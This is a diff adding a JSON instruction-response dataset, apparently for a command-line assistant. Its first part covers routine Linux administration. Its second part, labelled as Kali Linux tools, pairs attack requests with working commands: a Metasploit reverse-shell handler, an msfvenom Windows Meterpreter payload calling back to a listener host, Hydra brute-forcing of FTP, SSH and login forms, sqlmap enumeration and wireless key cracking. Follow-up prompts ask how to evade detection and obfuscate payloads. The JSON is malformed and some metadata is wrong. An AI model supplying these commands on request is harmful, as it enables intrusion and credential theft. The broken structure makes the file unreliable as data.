+  "mission_tag": "service:diagnose",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["systemctl", "ss", "journalctl"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to restart the web server?",
+    "How to check for configuration errors?"
+  ]
+},
+{
+  "instruction": "I need to open port 443 for HTTPS traffic on my firewall.",
+  "response": "sudo ufw allow 443/tcp",
+  "mission_tag": "network:firewall",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["ufw"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to list all open ports?",
+    "How to block a port with ufw?"
+  ]
+},
+{
+  "instruction": "How can I see all active network connections and the programs using them?",
+  "response": "ss -tulnp",
+  "mission_tag": "network:connections",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["ss"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to filter connections by port?",
+    "How to show only established connections?"
+  ]
+},
+{
+  "instruction": "What command displays real-time CPU and memory usage for all running processes?",
+  "response": "top",
+  "mission_tag": "performance:monitor",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": true
+  },
+  "tools": ["top"],
+  "os_compatibility": ["Linux", "Unix", "macOS"],
+  "follow_up": [
+    "How to sort processes by memory usage?",
+    "How to export top output to a file?"
+  ]
+},
+{
+  "instruction": "I've modified the sshd_config file. How do I apply the changes without restarting the server?",
+  "response": "sudo systemctl reload sshd",
+  "mission_tag": "service:reload",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["systemctl"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to check sshd status after reload?",
+    "How to test new SSH configuration?"
+  ]
+},
+{
+  "instruction": "How do I find all processes being run by the user 'www-data'?",
+  "response": "ps aux | grep 'www-data'",
+  "mission_tag": "process:list",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["ps", "grep"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to kill all processes for a user?",
+    "How to list processes by resource usage?"
+  ]
+},
+{
+  "instruction": "The system is slow. How do I check for I/O wait times to see if the disk is the bottleneck?",
+  "response": "Use the `iostat` command. A high '%iowait' value in the output indicates a potential disk bottleneck.",
+  "mission_tag": "performance:io",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["iostat"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to monitor disk I/O over time?",
+    "How to identify which process is causing high I/O?"
+  ]
+},
+{
+  "instruction": "My application can't connect to the database. How do I test network connectivity to the database server on port 3306?",
+  "response": "Use `nc -zv database.server.ip 3306` or `telnet database.server.ip 3306`.",
+  "mission_tag": "network:connectivity",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["nc", "telnet"],
+  "os_compatibility": ["Linux", "Unix", "macOS"],
+  "follow_up": [
+    "How to test multiple ports at once?",
+    "How to check firewall rules for the database server?"
+  ]
+},
+{
+  "instruction": "How do I create a new systemd service file for a custom application?",
+  "response": "Create a file at `/etc/systemd/system/myapp.service` with `[Unit]`, `[Service]`, and `[Install]` sections. Then run `sudo systemctl daemon-reload` and `sudo systemctl enable --now myapp`.",
+  "mission_tag": "service:create",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["systemctl"],
+  "os_compatibility": ["Linux", "systemd"],
+  "follow_up": [
+    "How to edit an existing systemd service?",
+    "How to check service logs?"
+  ]
+},
+{
+  "instruction": "What is the command to securely copy a file from my local machine to a remote server?",
+  "response": "scp /path/to/local/file user@remote_host:/path/to/remote/directory",
+  "mission_tag": "network:transfer",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["scp"],
+  "os_compatibility": ["Linux", "Unix", "macOS", "Windows"],
+  "follow_up": [
+    "How to copy directories recursively?",
+    "How to use rsync for file transfer?"
+  ]
+},
+{
+  "instruction": "How can I view the amount of free and used memory in a human-readable format?",
+  "response": "free -h",
+  "mission_tag": "performance:memory",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["free"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to monitor memory usage over time?",
+    "How to check swap usage?"
+  ]
+},
+{
+  "instruction": "Analyze this log entry from `/var/log/kern.log`: `Out of memory: Kill process 12345 (java) score 987 or sacrifice child`. What does this mean?",
+  "response": "The system ran out of memory and the Out-Of-Memory (OOM) killer was invoked to terminate the process with PID 12345, a Java application, to free up memory and prevent a system crash.",
+  "mission_tag": "logs:analyze",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["log analysis"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to prevent OOM killer from killing critical processes?",
+    "How to increase system memory?"
+  ]
+},
+{
+  "instruction": "I need to schedule a backup script to run every night at 2 AM. How can I do this?",
+  "response": "Edit the crontab for the root user with `sudo crontab -e` and add the line: `0 2 * * * /path/to/backup_script.sh`",
+  "mission_tag": "automation:schedule",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["cron"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to schedule a script for multiple users?",
+    "How to check if a cron job ran successfully?"
+  ]
+},
+{
+  "instruction": "How do I check the health and status of my hard drives?",
+  "response": "Use the `smartctl` command, for example: `sudo smartctl -a /dev/sda`.",
+  "mission_tag": "hardware:health",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["smartctl"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to run a short or long SMART test?",
+    "How to interpret SMART output?"
+  ]
+},
+{
+  "instruction": "I need to find a specific configuration line in a directory full of `.conf` files.",
+  "response": "grep -r 'your_config_key' /etc/app_directory/",
+  "mission_tag": "filesystem:search",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["grep"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to search for multiple keys?",
+    "How to ignore case in grep?"
+  ]
+},
+{
+  "instruction": "What's the best way to update all packages on a Debian-based system?",
+  "response": "sudo apt update && sudo apt upgrade -y",
+  "mission_tag": "system:update",
+  "context": {
+    "requires_root": true,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["apt"],
+  "os_compatibility": ["Linux", "Debian"],
+  "follow_up": [
+    "How to upgrade only security updates?",
+    "How to remove unused packages?"
+  ]
+},
+{
+  "instruction": "How can I find all files named 'README.txt' in the entire system, ignoring case sensitivity?",
+  "response": "find / -iname README.txt",
+  "mission_tag": "filesystem:search",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["find"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to search for files modified in the last 7 days?",
+    "How to search for files by size?"
+  ]
+},
+{
+  "instruction": "I need to find all `.txt` and `.log` files within the `/home` directory using a regular expression.",
+  "response": "find /home -regextype posix-extended -regex \".*(\\.txt|\\.log)\"",
+  "mission_tag": "filesystem:search",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["find"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to exclude certain directories from find command?",
+    "How to search for files based on their content?"
+  ]
+},
+{
+  "instruction": "Find all files in `/var/log` that are larger than 20 megabytes.",
+  "response": "find /var/log -size +20M",
+  "mission_tag": "filesystem:search",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["find"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to delete large log files safely?",
+    "How to compress large log files?"
+  ]
+},
+{
+  "instruction": "How do I execute the `ls -l` command on every file larger than 500MB on the system?",
+  "response": "find / -size +500M -exec ls -l {} \\;",
+  "mission_tag": "filesystem:search",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["find", "ls"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to delete files found by this command?",
+    "How to search only in specific directories?"
+  ]
+},
+{
+  "instruction": "Show me how to find and delete all empty directories on the system.",
+  "response": "find / -type d -empty -exec rm --dir {} \\;",
+  "mission_tag": "filesystem:cleanup",
+  "context": {
+    "requires_root": true,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["find", "rm"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to list empty directories without deleting?",
+    "How to exclude certain directories from deletion?"
+  ]
+},
+{
+  "instruction": "I need to find and remove any broken symbolic links across the entire filesystem.",
+  "response": "find / -xtype l -exec rm {} \\;",
+  "mission_tag": "filesystem:cleanup",
+  "context": {
+    "requires_root": true,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["find", "rm"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to list broken symlinks without removing?",
+    "How to find broken symlinks in a specific directory?"
+  ]
+},
+{
+  "instruction": "How do I change the user and group ownership of a file at the same time?",
+  "response": "chown user:group filename",
+  "mission_tag": "permissions:change",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["chown"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to change ownership recursively?",
+    "How to verify ownership changes?"
+  ]
+},
+{
+  "instruction": "Change the group of 'file.txt' to 'developers' without altering the user owner.",
+  "response": "chown :developers file.txt",
+  "mission_tag": "permissions:change",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["chown"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to change ownership recursively?",
+    "How to set default group permissions?"
+  ]
+},
+{
+  "instruction": "How do I recursively change the ownership of the 'projects' directory and all its contents to the user 'gmr'?",
+  "response": "chown -R gmr projects",
+  "mission_tag": "permissions:change",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["chown"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to change group ownership recursively?",
+    "How to verify recursive ownership changes?"
+  ]
+},
+{
+  "instruction": "Set the permissions of 'script.sh' to 755 using octal notation.",
+  "response": "chmod 755 script.sh",
+  "mission_tag": "permissions:set",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["chmod"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "What do the numbers in chmod 755 mean?",
+    "How to add execute permission for all users?"
+  ]
+},
+{
+  "instruction": "Using symbolic notation, add write permission for all users to 'file.txt' without changing existing permissions.",
+  "response": "chmod a+w file.txt",
+  "mission_tag": "permissions:set",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["chmod"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to remove write permission for all users?",
+    "How to set multiple permissions at once?"
+  ]
+},
+{
+  "instruction": "How do you apply the `setuid` permission to an executable file `/bin/custom_app`?",
+  "response": "chmod u+s /bin/custom_app",
+  "mission_tag": "permissions:set",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["chmod"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to check if setuid is set?",
+    "What are the risks of setuid?"
+  ]
+},
+{
+  "instruction": "What is the command to apply the sticky bit to the `/shared` directory?",
+  "response": "chmod +t /shared/",
+  "mission_tag": "permissions:set",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["chmod"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to check if sticky bit is set?",
+    "What does the sticky bit do?"
+  ]
+},
+{
+  "instruction": "Create a new user named 'jdoe' and also create their home directory.",
+  "response": "useradd -m jdoe",
+  "mission_tag": "user:management",
+  "context": {
+    "requires_root": true,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["useradd"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to assign a password to the new user?",
+    "How to add the user to specific groups?"
+  ]
+},
+{
+  "instruction": "Create a new user 'asmith' and set their login shell to `/bin/bash`.",
+  "response": "useradd asmith -s /bin/bash",
+  "mission_tag": "user:management",
+  "context": {
+    "requires_root": true,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["useradd"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to change a user's shell after creation?",
+    "How to set a default shell for all new users?"
+  ]
+},
+{
+  "instruction": "Assign the user 'bjohnson' to the secondary groups 'developers' and 'testers' upon creation.",
+  "response": "useradd bjohnson -G developers,testers",
+  "mission_tag": "user:management",
+  "context": {
+    "requires_root": true,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["useradd"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to add a user to groups after creation?",
+    "How to list all groups for a user?"
+  ]
+},
+{
+  "instruction": "How do I add an existing user 'jdoe' to the 'sudo' group so they can have admin privileges?",
+  "response": "usermod -a -G sudo jdoe",
+  "mission_tag": "user:management",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["usermod"],
+  "os_compatibility": ["Linux"],
+  "follow_up": [
+    "How to remove a user from a group?",
+    "How to check if a user is in the sudo group?"
+  ]
+},
+{
+  "instruction": "Create a new tar archive named 'backup.tar' containing the directory '/home/my_docs'.",
+  "response": "tar cvf backup.tar /home/my_docs",
+  "mission_tag": "archive:create",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["tar"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to compress a tar archive?",
+    "How to extract files from a tar archive?"
+  ]
+},
+{
+  "instruction": "How do I create a compressed tar archive (tar.gz) of a directory?",
+  "response": "tar cvzf archive.tar.gz /path/to/directory",
+  "mission_tag": "archive:create",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["tar"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to extract files from a tar.gz archive?",
+    "How to list contents of a tar.gz without extracting?"
+  ]
+},
+{
+  "instruction": "List the contents of 'archive.tar.gz' without extracting it.",
+  "response": "tar tzvf archive.tar.gz",
+  "mission_tag": "archive:list",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["tar"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to extract a single file from a tar.gz?",
+    "How to check archive integrity?"
+  ]
+},
+{
+  "instruction": "Extract a single file named 'config.yml' from 'backup.tar'.",
+  "response": "tar xvf backup.tar config.yml",
+  "mission_tag": "archive:extract",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["tar"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to extract multiple files from a tar archive?",
+    "How to extract files to a specific directory?"
+  ]
+},
+{
+  "instruction": "Replace only the first occurrence of the word 'database' with 'DB' on each line of 'config.txt'.",
+  "response": "sed 's/database/DB/' config.txt",
+  "mission_tag": "text:edit",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["sed"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to replace all occurrences of a word?",
+    "How to edit a file in-place with sed?"
+  ]
+},
+{
+  "instruction": "Delete lines 2 through 5 from the file 'output.log'.",
+  "response": "sed '2,5d' output.log",
+  "mission_tag": "text:edit",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["sed"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to delete a single line with sed?",
+    "How to save changes in-place?"
+  ]
+},
+{
+  "instruction": "From the file `/etc/passwd`, how can I extract just the usernames, which are in the first field?",
+  "response": "cut -d':' -f1 /etc/passwd",
+  "mission_tag": "text:extract",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["cut"],
+  "os_compatibility": ["Linux", "Unix"],
+  "follow_up": [
+    "How to extract other fields from /etc/passwd?",
+    "How to count the number of users?"
+  ]
+},
+{
+  "instruction": "Download the content from 'https://example.com' and save it to a file named 'page.html'.",
+  "response": "curl -o page.html https://example.com",
+  "mission_tag": "network:download",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "internet_required": true
+  },
+  "tools": ["curl"],
+  "os_compatibility": ["Linux", "Unix", "macOS"],
+  "follow_up": [
+    "How to download files in the background?",
+    "How to follow redirects with curl?"
+  ]
+},
+{
+  "instruction": "How do I make a POST request with curl, sending 'user=admin' and 'pass=12345'?",
+  "response": "curl -d \"user=admin&pass=12345\" https://example.com/login",
+  "mission_tag": "network:request",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false,
+    "internet_required": true
+  },
+  "tools": ["curl"],
+  "os_compatibility": ["Linux", "Unix", "macOS"],
+  "follow_up": [
+    "How to send JSON data with curl?",
+    "How to set custom headers in a curl request?"
+  ]
+}
+
+]
+"_comment": "Kali Linux Tools Data sets begins here"
+[
+
+{
+  "instruction": "Scan all TCP ports and detect service versions on a target host.",
+  "response": "nmap -sV -p 1-65535 192.168.1.1",
+  "mission_tag": "network:scan",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["nmap"],
+  "os_compatibility": ["Linux"],
+  "category": "Networking",
+  "use_case": "Port scanning and service detection",
+  "flags": ["-sV", "-p"],
+  "reference_link": "https://nmap.org/book/man-briefoptions.html",
+  "follow_up": [
+    "How to perform a stealth scan with nmap?",
+    "How to scan multiple hosts with nmap?"
+  ]
+}
+{
+  "instruction": "Perform a stealth SYN scan and OS detection.",
+  "response": "nmap -sS -O 192.168.1.1",
+  "mission_tag": "network:scan",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["nmap"],
+  "os_compatibility": ["Linux"],
+  "category": "Networking",
+  "use_case": "Stealth scanning and OS fingerprinting",
+  "flags": ["-sS", "-O"],
+  "reference_link": "https://nmap.org/book/man-briefoptions.html",
+  "follow_up": [
+    "How to scan for specific OS versions?",
+    "How to avoid detection during scanning?"
+  ]
+}
+{
+  "instruction": "Set up a reverse TCP handler for incoming connections.",
+  "response": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; run'",
+  "mission_tag": "exploitation:handler",
+  "context": {
+    "requires_root": false,
+    "disruptive": true,
+    "interactive": true
+  },
+  "tools": ["metasploit"],
+  "os_compatibility": ["Linux"],
+  "category": "Exploitation",
+  "use_case": "Exploit handling and payload delivery",
+  "flags": ["-q", "-x"],
+  "reference_link": "https://docs.metasploit.com/",
+  "follow_up": [
+    "How to generate a payload with msfvenom?",
+    "How to handle multiple sessions in Metasploit?"
+  ]
+}
+{
+  "instruction": "Enumerate databases on a vulnerable web application.",
+  "response": "sqlmap -u http://example.com --dbs",
+  "mission_tag": "web:sql_injection",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["sqlmap"],
+  "os_compatibility": ["Linux"],
+  "category": "Web Application",
+  "use_case": "SQL injection testing",
+  "flags": ["-u", "--dbs"],
+  "reference_link": "http://sqlmap.org/",
+  "follow_up": [
+    "How to enumerate tables in a specific database?",
+    "How to extract data from a table using sqlmap?"
+  ]
+}
+{
+  "instruction": "Brute-force FTP credentials using a password list.",
+  "response": "hydra -l admin -P passwords.txt ftp://192.168.1.1",
+  "mission_tag": "password:bruteforce",
+  "context": {
+    "requires_root": false,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["hydra"],
+  "os_compatibility": ["Linux"],
+  "category": "Password Cracking",
+  "use_case": "Credential brute-forcing",
+  "flags": ["-l", "-P"],
+  "reference_link": "https://www.kali.org/tools/hydra/",
+  "follow_up": [
+    "How to brute-force SSH credentials with hydra?",
+    "How to use a custom user list in hydra?"
+  ]
+},
+{
+  "instruction": "Crack WEP/WPA keys from captured packets using a wordlist.",
+  "response": "aircrack-ng -w wordlist.txt capture.cap",
+  "mission_tag": "wireless:keycracking",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["aircrack-ng"],
+  "os_compatibility": ["Linux"],
+  "category": "Wireless",
+  "use_case": "Wireless network key cracking",
+  "flags": ["-w"],
+  "reference_link": "https://www.aircrack-ng.org/",
+  "follow_up": [
+    "How to capture packets for aircrack-ng?",
+    "How to speed up WPA cracking using GPU?"
+  ]
+},
+{
+  "instruction": "Launch Burp Suite for web vulnerability testing.",
+  "response": "java -jar burpsuite.jar",
+  "mission_tag": "web:vulnerability_scanning",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": true
+  },
+  "tools": ["burpsuite"],
+  "os_compatibility": ["Linux"],
+  "category": "Web Application",
+  "use_case": "Web application security testing",
+  "flags": [],
+  "reference_link": "https://portswigger.net/burp/documentation",
+  "follow_up": [
+    "How to set up a proxy with Burp Suite?",
+    "How to intercept and modify HTTP requests in Burp?"
+  ]
+},
+{
+  "instruction": "Capture and analyze TCP traffic on port 80 using Wireshark.",
+  "response": "wireshark -i eth0 -f 'tcp port 80'",
+  "mission_tag": "network:packet_analysis",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": true
+  },
+  "tools": ["wireshark"],
+  "os_compatibility": ["Linux"],
+  "category": "Networking",
+  "use_case": "Network traffic analysis",
+  "flags": ["-i", "-f"],
+  "reference_link": "https://www.wireshark.org/docs/",
+  "follow_up": [
+    "How to capture only HTTPS traffic in Wireshark?",
+    "How to use display filters for deeper analysis?"
+  ]
+},
+{
+  "instruction": "Crack password hashes using a wordlist with John the Ripper.",
+  "response": "john --wordlist=rockyou.txt hash.txt",
+  "mission_tag": "password:cracking",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["john"],
+  "os_compatibility": ["Linux"],
+  "category": "Password Cracking",
+  "use_case": "Password hash cracking",
+  "flags": ["--wordlist"],
+  "reference_link": "https://www.openwall.com/john/",
+  "follow_up": [
+    "How to crack NTLM hashes with John?",
+    "How to use custom rules with John the Ripper?"
+  ]
+},
+{
+  "instruction": "Crack MD5 hashes using a wordlist with Hashcat.",
+  "response": "hashcat -m 0 -a 0 hash.txt wordlist.txt",
+  "mission_tag": "password:high_perf_cracking",
+  "context": {
+    "requires_root": false,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["hashcat"],
+  "os_compatibility": ["Linux"],
+  "category": "Password Cracking",
+  "use_case": "High-performance hash cracking",
+  "flags": ["-m", "-a"],
+  "reference_link": "https://hashcat.net/hashcat/",
+  "follow_up": [
+    "How to use Hashcat with GPU acceleration?",
+    "What are the different hash modes in Hashcat?"
+  ]
+},
+{
+  "instruction": "Scan a web server for vulnerabilities and misconfigurations using Nikto.",
+  "response": "nikto -h http://example.com",
+  "mission_tag": "web:vulnerability_scanning",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["nikto"],
+  "os_compatibility": ["Linux"],
+  "category": "Web Application",
+  "use_case": "Web server vulnerability scanning",
+  "flags": ["-h"],
+  "reference_link": "https://cirt.net/Nikto2",
+  "follow_up": [
+    "How to scan HTTPS websites with Nikto?",
+    "How to use Nikto with custom user agents?"
+  ]
+},
+{
+  "instruction": "Brute-force directories and files on a web server using Dirb.",
+  "response": "dirb http://example.com wordlist.txt",
+  "mission_tag": "web:directory_enum",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["dirb"],
+  "os_compatibility": ["Linux"],
+  "category": "Web Application",
+  "use_case": "Directory enumeration",
+  "flags": [],
+  "reference_link": "https://www.kali.org/tools/dirb/",
+  "follow_up": [
+    "How to use a custom wordlist with Dirb?",
+    "How to brute-force HTTPS targets with Dirb?"
+  ]
+},
+{
+  "instruction": "Enumerate database tables via SQL injection using SQLMap.",
+  "response": "sqlmap -u http://example.com --tables",
+  "mission_tag": "web:sql_injection",
+  "context": {
+    "requires_root": false,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["sqlmap"],
+  "os_compatibility": ["Linux"],
+  "category": "Web Application",
+  "use_case": "SQL injection exploitation",
+  "flags": ["-u", "--tables"],
+  "reference_link": "http://sqlmap.org/",
+  "follow_up": [
+    "How to dump database data using SQLMap?",
+    "How to detect injectable parameters with SQLMap?"
+  ]
+},
+{
+  "instruction": "Brute-force SSH credentials using user and password lists.",
+  "response": "hydra -L users.txt -P passwords.txt ssh://192.168.1.1",
+  "mission_tag": "password:bruteforce:ssh",
+  "context": {
+    "requires_root": false,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["hydra"],
+  "os_compatibility": ["Linux"],
+  "category": "Password Cracking",
+  "use_case": "SSH brute-forcing",
+  "flags": ["-L", "-P"],
+  "reference_link": "https://www.kali.org/tools/hydra/",
+  "follow_up": [
+    "How to use verbose mode in Hydra?",
+    "How to throttle brute-force speed with Hydra?"
+  ]
+},
+{
+  "instruction": "Scan for SMB versions on a network range using Metasploit.",
+  "response": "msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run'",
+  "mission_tag": "network:smb_enum",
+  "context": {
+    "requires_root": true,
+    "disruptive": false,
+    "interactive": true
+  },
+  "tools": ["metasploit"],
+  "os_compatibility": ["Linux"],
+  "category": "Networking",
+  "use_case": "Service enumeration",
+  "flags": ["-q", "-x"],
+  "reference_link": "https://docs.metasploit.com/",
+  "follow_up": [
+    "How to enumerate SMB shares with Metasploit?",
+    "How to use Metasploit for MS17-010 vulnerability detection?"
+  ]
+},
+{
+  "instruction": "Enable monitor mode on a wireless interface using airmon-ng.",
+  "response": "airmon-ng start wlan0",
+  "mission_tag": "wireless:monitor_mode",
+  "context": {
+    "requires_root": true,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["aircrack-ng"],
+  "os_compatibility": ["Linux"],
+  "category": "Wireless",
+  "use_case": "Wireless packet capturing",
+  "flags": ["start"],
+  "reference_link": "https://www.aircrack-ng.org/",
+  "follow_up": [
+    "How to stop monitor mode with airmon-ng?",
+    "How to use airmon-ng on USB adapters?"
+  ]
+},
+{
+  "instruction": "Enumerate web directories and files using Nmap's http-enum script.",
+  "response": "nmap --script http-enum 192.168.1.1",
+  "mission_tag": "web:http_enum",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["nmap"],
+  "os_compatibility": ["Linux"],
+  "category": "Web Application",
+  "use_case": "Web enumeration",
+  "flags": ["--script"],
+  "reference_link": "https://nmap.org/nsedoc/scripts/http-enum.html",
+  "follow_up": [
+    "How to use multiple NSE scripts in Nmap?",
+    "How to speed up web enumeration with Nmap?"
+  ]
+},
+{
+  "instruction": "Enumerate WordPress users with WPScan.",
+  "response": "wpscan --url http://example.com --enumerate u",
+  "mission_tag": "web:wordpress_enum",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["wpscan"],
+  "os_compatibility": ["Linux"],
+  "category": "Web Application",
+  "use_case": "WordPress vulnerability scanning",
+  "flags": ["--url", "--enumerate"],
+  "reference_link": "https://wpscan.com/wordpress-security-scanner",
+  "follow_up": [
+    "How to scan for vulnerable plugins using WPScan?",
+    "How to use an API token with WPScan?"
+  ]
+},
+{
+  "instruction": "Brute-force HTTP form-based authentication using Hydra.",
+  "response": "hydra -l admin -P passwords.txt http-post-form '/login:username=^USER^&password=^PASS^:Invalid'",
+  "mission_tag": "password:bruteforce:http_form",
+  "context": {
+    "requires_root": false,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["hydra"],
+  "os_compatibility": ["Linux"],
+  "category": "Password Cracking",
+  "use_case": "Web form brute-forcing",
+  "flags": ["-l", "-P"],
+  "reference_link": "https://www.kali.org/tools/hydra/",
+  "follow_up": [
+    "How to identify correct failure strings in Hydra?",
+    "How to brute-force login forms with CSRF tokens?"
+  ]
+},
+{
+  "instruction": "Generate a reverse TCP Meterpreter payload for Windows using MSFVenom.",
+  "response": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe",
+  "mission_tag": "exploitation:payload_generation",
+  "context": {
+    "requires_root": false,
+    "disruptive": false,
+    "interactive": false
+  },
+  "tools": ["msfvenom"],
+  "os_compatibility": ["Linux"],
+  "category": "Exploitation",
+  "use_case": "Payload generation",
+  "flags": ["-p", "-f", "-o"],
+  "reference_link": "https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html",
+  "follow_up": [
+    "How to create Android payloads using MSFVenom?",
+    "How to obfuscate payloads generated with MSFVenom?"
+  ]
+},
+{
+  "instruction": "Test for SQL injection with POST data and increased detection level.",
+  "response": "sqlmap -u http://example.com --data 'id=1' --level 3",
+  "mission_tag": "web:sql_injection_advanced",
+  "context": {
+    "requires_root": false,
+    "disruptive": true,
+    "interactive": false
+  },
+  "tools": ["sqlmap"],
